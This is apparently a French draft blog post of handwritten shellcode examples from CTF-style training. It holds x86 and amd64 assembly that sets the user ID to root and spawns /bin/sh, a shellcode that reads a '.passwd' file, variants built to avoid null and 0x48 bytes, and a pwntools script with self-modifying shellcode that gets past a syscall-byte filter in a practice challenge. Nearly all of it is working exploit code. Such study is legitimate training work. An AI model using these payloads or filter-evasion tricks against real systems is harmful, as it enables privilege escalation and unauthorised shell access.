---
title: 'Examples'
date: 2023-02-20
draft: true
categories:
  - shellcoding
tags:
  - pwn
  - shellcoding
---

Quelques exemples de shellcodes fais à la main en _amd64_ pour différents contextes.
## X86 Shellcode
```nasm title:x86.s
_start:
	push   0x46
	pop    eax
	mov    bx, 0x4b7
	mov    cx, 0x453
	int    0x80

	xor    edx, edx
	push   0xb
	pop    eax
	push   edx
	push   0x68732f2f
	push   0x6e69622f
	mov    ebx, esp
	push   edx
	push   ebx
	mov    ecx, esp
	int    0x80
```
## Lire un Fichier

```nasm
.global _start
_start:
.intel_syntax noprefix
shellcode:
    mov rax, 0x6b
    syscall

	mov rax, 0x02
    xor rsi, rsi
    xor rdx, rdx
    lea rdi, [rip+passwd]
    syscall

	push rax
    mov rax, 0x28
    pop rsi
	mov rdi, 1
    xor rdx, rdx
    mov r10, 1000
    syscall

passwd:
    .string ".passwd"
```

## Pas de Null Bytes

```nasm
.global _start
_start:
.intel_syntax noprefix
	
# Set Real UID to root(0)
	xor rax, rax
	mov al, 0x71
	xor rdi, rdi
	xor rsi, rsi
	syscall
	
# Call /bin/sh
	xor rbx, rbx
	push rbx                          # on push un null byte sur la stack pour la fin de la string du path de /bin/sh
	mov rbx, 0x68732f6e69622f2f       # on push /bin/sh sur la stack
	push rbx
	xor rax, rax
	mov al, 59
	xor rdi, rdi
	mov rdi, rsp                      # on récupère "/bin/sh\\0" depuis la stack
	xor rsi, rsi
	xor rdx, rdx
	syscall
```

## Pas de ‘H’ byte

Le byte ‘H’ (0x48) est un byte qui précède chaque instruction effectuée en 64 bits. C’est une fonctionnalité qui permet la rétro-compatibilité entre le x86 et x64. Ainsi on peut executer du 32 bits sur une architecture en 64 bits.

```nasm
.global _start
_start:
.intel_syntax noprefix
	# Set Real UID to root(0)
	xor eax, eax
	mov al, 0x71
	xor edi, edi
	xor esi, esi
	syscall
	
	# Call /bin/sh
	lea ebx, [eip+binsh]
	xor eax, eax
	mov al, 59
	xor edi, edi
	mov edi, ebx
	xor esi, esi
	xor edx, edx
	syscall
binsh:
    .string "/bin/sh"
```

## Self-Modifying Shellcode

Ici on a besoin de bypass un check sur les bytes contenu dans notre shellcode. Si le programme repère un appel à un syscall(bytes: `0f05`) dans notre shellcode, alors il crash.

La solution est de simplement créer un shellcode qui va s’auto-modifier au moment de l’execution. Pour cela, on va envoyer notre payload classique en remplaçant les bytes `0f05` par `0f04` et on va faire en sorte que notre shellcode aye les modifier en mémoire lorsqu’il sera exécuté.

```nasm
import pwn

p = pwn.process(['/challenge/babyshell_level5'])

head = p.readuntil(b"Reading 0x1000 bytes").decode("utf-8")
address = head.split(" ")[73].split("!")[0]

pwn.context.update(arch='amd64', os='linux')
payload = pwn.asm(f"""
.global _start
_start:
.intel_syntax noprefix
	mov bl, 0x05
	mov [{address}+28], bl
	mov [{address}+62], bl
	xor rax, rax
	mov al, 0x71
	xor rdi, rdi
	xor rsi, rsi
	syscall
	xor rbx, rbx
	push rbx
	mov rbx, 0x68732f6e69622f2f
	push rbx
	xor rax, rax
	mov al, 59
	xor rdi, rdi
	mov rdi, rsp
	xor rsi, rsi
	xor rdx, rdx
	syscall
""")

raw_payload = 'b305881c251c10121c881c253e10121c4831c0b0714831ff4831f60f044831db5348bb2f2f62696e2f7368534831c0b03b4831ff4889e74831f64831d20f04'

p.write(bytes.fromhex(raw_payload))

p.interactive()

p.wait()
```
